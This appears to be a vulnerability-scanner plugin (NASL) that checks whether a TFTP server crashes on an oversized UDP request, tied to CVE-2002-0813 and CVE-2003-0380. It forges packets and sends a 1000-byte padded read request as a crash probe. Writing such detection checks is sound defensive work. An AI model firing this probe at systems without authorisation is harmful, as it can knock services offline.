if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.18264" );
	script_version( "2020-11-10T09:46:51+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 09:46:51 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 401, 5328, 7819 );
	script_cve_id( "CVE-2002-0813", "CVE-2003-0380" );
	script_name( "TFTPD overflow" );
	script_category( ACT_KILL_HOST );
	script_copyright( "Copyright (C) 2005 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "solution", value: "Upgrade your software, or disable this service." );
	script_tag( name: "summary", value: "The remote TFTP server dies when it receives a too big UDP datagram." );
	script_tag( name: "impact", value: "An attacker may use this flaw to disable your server, or even execute
  arbitrary code on your system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_probe" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
if(TARGET_IS_IPV6()){
	exit( 0 );
}
func tftp_ping( port, huge ){
	var req, rep, sport, ip, u, filter, data, i;
	if( huge ){
		req = "\x00\x01" + crap( huge ) + "\0netascii\0";
	}
	else {
		vtstrings = get_vt_strings();
		req = "\x00\x01" + vtstrings["default"] + rand() + "\0netascii\0";
	}
	sport = rand() % 64512 + 1024;
	ip = forge_ip_packet( ip_hl: 5, ip_v: 4, ip_tos: 0, ip_len: 20, ip_off: 0, ip_ttl: 64, ip_p: IPPROTO_UDP, ip_src: this_host() );
	u = forge_udp_packet( ip: ip, uh_sport: sport, uh_dport: port, uh_ulen: 8 + strlen( req ), data: req );
	filter = "udp and dst port " + sport + " and src host " + get_host_ip() + " and udp[8:1]=0x00";
	data = NULL;
	for(i = 0;i < 2;i++){
		rep = send_packet( packet: u, pcap_active: TRUE, pcap_filter: filter );
		if(rep){
			data = get_udp_element( udp: rep, element: "data" );
			if(data[0] == "\0" && ( data[1] == "\x03" || data[1] == "\x05" )){
				return TRUE;
			}
		}
	}
	return FALSE;
}
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_ping( port: port )){
	exit( 0 );
}
start_denial();
tftp_ping( port: port, huge: 1000 );
tftpalive = tftp_ping( port: port );
alive = end_denial();
if( !alive ){
	security_message( port: port, proto: "udp" );
}
else {
	if(!tftpalive){
		security_message( port: port, proto: "udp" );
	}
}
if(!alive || !tftpalive){
	set_kb_item( name: "tftp/" + port + "/overflow", value: TRUE );
	exit( 0 );
}
exit( 99 );

